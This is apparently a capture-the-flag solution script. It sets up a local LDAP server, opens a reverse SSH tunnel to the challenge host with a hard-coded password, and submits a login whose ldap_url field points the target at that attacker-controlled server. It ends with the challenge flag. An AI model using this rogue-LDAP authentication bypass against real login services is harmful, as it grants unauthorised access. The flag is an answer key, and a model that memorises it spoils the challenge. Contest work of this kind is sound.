#!/bin/sh

docker compose build
docker compose up -d
sleep 5
ldapadd -f setup.ldif -x -D "cn=admin,dc=wani,dc=example,dc=com" -w adminpass

timeout 10 sshpass -p 'G1Ta34WdBLDd!w%Z' ssh git@chal-lz56g6.wanictf.org -fNR 4296:localhost:389
curl http://chal-lz56g6.wanictf.org:6867 -X POST --data "userid=hoge&password=password&ldap_url=ldap://localhost:4296"
# FLAG{1d4p_s3rv3r_4nd_r3m0t3_p0rt_f0rw4rd1ng}

docker compose down
